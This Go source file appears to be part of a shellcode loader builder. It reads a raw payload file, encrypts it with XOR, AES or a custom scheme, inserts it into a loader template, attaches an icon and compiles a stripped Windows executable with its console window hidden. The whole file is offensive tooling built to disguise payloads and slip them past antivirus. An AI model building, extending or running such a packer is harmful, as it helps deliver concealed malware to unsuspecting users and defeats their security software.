package Public

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

var Build BuildFile
var newfileContent string
var err error
var EnApi ApiEDcrypt
var ReplaceStr = map[string]string{"KeyKey": "", "HideConsole": ""}
var TestShell CodToshellKey

//BuildFile out file.go canshu
type BuildFile struct {
	Module  string
	File    string
	HideCmd bool
	//	Random            bool
	Encrypt           string
	Output            string
	Icon              string
	ModulefileContent []byte
}

type CodToshellKey struct {
	CodeByteShell     []byte
	CodeToStringShell string
	KeyKey            string
}

//set BuilFile
func (this *BuildFile) SetBuilFile(module, file, encrypt, output, icon string, HideCmd bool) {
	this.Module = module
	this.File = file
	this.HideCmd = HideCmd
	this.Encrypt = encrypt
	this.Output = output
	this.Icon = icon
}

//read  payload.bin
func (this *BuildFile) ReadFile() {
	fileContent, err := ioutil.ReadFile(this.File)
	if err != nil {
		fmt.Println("[-] read fail", err)
		os.Exit(0)
	}
	fmt.Println("[+] read " + this.File + " file success.")
	this.RemoveAllOutput()
	TestShell.CodeByteShell = fileContent
}

// move and replace module
func (this *BuildFile) MoveAndReplaceModule() {
	if this.Icon != "" {
		err := this.ExecAddIcon()
		if err != nil {
			fmt.Println("[-] Rsrc.exe Add icon err,Please check the", this.Icon)
			this.RemoveAllOutput()
			os.Exit(0)
		}
		fmt.Println("[+] Rsrc.exe Add icon success")
	}
	this.ModulefileContent, err = ioutil.ReadFile("./template/" + this.Module)
	if err != nil {
		fmt.Println("[-] There is no " + this.Module + " module, module parameter (-m) is error.")
		this.RemoveAllOutput()
		os.Exit(0)
	}
	fmt.Println("[+] Select the " + this.Module + " module.")
	for key, value := range ReplaceStr {
		this.ModulefileContent = []byte(strings.Replace(string(this.ModulefileContent), "/******"+key+"******/", value, 1))
	}

	err = ioutil.WriteFile("./output/"+this.Output+".go", []byte(this.ModulefileContent), 0644)
	if err != nil {
		fmt.Println("Write Error", "./output/"+this.Output+".go")
		this.RemoveAllOutput()
		fmt.Println(err)
	}
	this.GoBuildAndRemoveFileToExec()
}
func (this BuildFile) ExecAddIcon() error {
	cmd := exec.Command("./lib/rsrc.exe", "-arch", "amd64", "-manifest", ".\\lib\\ico.manifest", "-ico", this.Icon, "-o", ".\\output\\"+this.Output+".syso")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] %s", fmt.Sprint(err)+": "+stderr.String())
		return err
	}
	return nil
}

//replace module
func (this BuildFile) ReplaceModule(module, oldmodulestr, newmodulestr string) string {
	return strings.Replace(module, "/*%s%"+oldmodulestr+"%s%*/", newmodulestr, 1)
}

//选择加密方式
func (this BuildFile) SelectEncryp() {
	fmt.Println("[+] Select the " + this.Encrypt + " encryption method.")
	switch this.Encrypt {
	case "QianKunBaGua":
		EnApi = QianKunBaGua{}
	case "Base64Xor":
		EnApi = Base64Xor{}
	case "AesCBC":
		EnApi = AesCBC{}
	case "AesECB":
		EnApi = AesECB{}
	case "AesCFB":
		EnApi = AesCFB{}
	default:
		fmt.Println("[-] There is no " + this.Encrypt + " encryption module, encrypt parameter (-e) is error.")
		os.Exit(0)
	}
	EnApi.CodeToShellEncrypt(TestShell)
	this.createFileWithDir(".\\output\\", "CodeToStringShell.txt", ReplaceStr["codeshell"])
	fmt.Println("[+] " + this.Encrypt + " encryption success.")
	this.MoveAndReplaceModule()
}
func (this BuildFile) createFileWithDir(path string, name string, content string) {
	os.MkdirAll(path, os.ModePerm)
	file, _ := os.OpenFile(path+"/"+name, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
	defer file.Close()
	file.WriteString(content)
}

func (this BuildFile) GoBuildAndRemoveFileToExec() {
	var err error
	fmt.Println("[+] Prepare to generate " + this.Output + " file.")
	err = this.GoBuildFileToExec()
	if err != nil {
		fmt.Println("[-] Go build " + this.Output + " error.")
	}
	this.RemoveAllOutput()
}

func (this BuildFile) RemoveAllOutput() {
	//os.RemoveAll("./output/")
}

//go build
func (this BuildFile) GoBuildFileToExec() error {
	fmt.Println("[+] Use go build No random function And Main.go")
	if !this.HideCmd {
		fmt.Println("[+] Use -H windowsgui model")
		cmd := exec.Command("go", "build", "-trimpath", "-ldflags", "-w -s -H windowsgui", "-o", this.Output+"_", ".\\output\\")
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			fmt.Printf("[-] %s", fmt.Sprint(err)+": "+stderr.String())
			return err
		}
	} else {
		fmt.Println("[+] Use Windows api Hide")
		cmd := exec.Command("go", "build", "-trimpath", "-ldflags", "-w -s", "-o", this.Output+"_", ".\\output\\")
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			fmt.Printf("[-] %s", fmt.Sprint(err)+": "+stderr.String())
			return err
		}
	}
	fmt.Println("[+] Go build " + this.Output + " success.")
	return nil
}
